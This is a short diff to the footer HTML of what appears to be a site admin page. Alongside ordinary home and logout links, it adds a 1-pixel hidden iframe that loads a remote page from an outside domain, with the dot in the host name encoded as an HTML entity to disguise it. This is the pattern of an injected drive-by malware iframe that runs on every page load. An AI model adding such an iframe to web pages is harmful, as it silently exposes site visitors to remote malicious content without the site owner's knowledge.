@@ -13,9 +13,13 @@
 			<div class="centerwrapper">
 				<div class="header">
 				
-
+				<a href="admin.php"><img style="padding-left:150px; margin-top:15px;" src="../images/home.png" /></a>
+				<div class="logout">
+				<a href="../index.php">Log out</a>
+				</div>
 				</div>
 			</div>
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
 </html>			
 		
